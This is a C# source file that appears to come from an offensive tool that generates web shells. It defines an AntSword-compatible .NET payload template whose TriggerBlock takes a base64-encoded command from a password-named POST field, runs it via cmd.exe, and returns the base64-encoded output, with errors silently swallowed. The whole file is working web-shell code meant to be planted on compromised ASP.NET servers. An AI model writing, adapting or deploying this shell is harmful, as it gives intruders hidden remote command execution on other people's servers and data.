namespace NMG.Shells;

/// <summary>
/// AntSword .NET protocol payload template.
/// AntSword uses a simple POST-based protocol with base64-encoded commands.
/// Key is base64(password), request body contains base64-encoded command.
/// </summary>
public static class AntSwordNet
{
    public const string TriggerBlock = """
        System.Web.HttpContext Ctx = System.Web.HttpContext.Current;
        System.Web.HttpResponse Resp = Ctx.Response;
        try
        {
            if (Ctx.Request.ContentType.Contains("www-form") && Ctx.Request[{{PASSWORD}}] != null)
            {
                string encCmd = Ctx.Request[{{PASSWORD}}];
                byte[] cmdBytes = System.Convert.FromBase64String(encCmd);
                string cmd = System.Text.Encoding.UTF8.GetString(cmdBytes);

                // Execute command
                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + cmd;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi);
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                string result = stdout + stderr;
                if (result.Length == 0) result = " ";
                byte[] resultBytes = System.Text.Encoding.UTF8.GetBytes(result);
                string b64Result = System.Convert.ToBase64String(resultBytes);

                Resp.ContentType = "text/html";
                Resp.Write(b64Result);
                Resp.End();
            }
        }
        catch (Exception)
        {
        }
        """;

    public const string MembersBlock = """
        public string password = {{PASSWORD}};
        public static bool load = false;
        """;

    public const string RandomStringBlock = """
        public static string GenerateRandomString(int length)
        {
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            byte[] b = new byte[4];
            new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);
            System.Random rd = new System.Random(System.BitConverter.ToInt32(b, 0));
            for (int i = 0; i < length; i++)
            {
                sb.Append(((char)rd.Next(33, 127)).ToString());
            }
            return sb.ToString();
        }
        """;
}
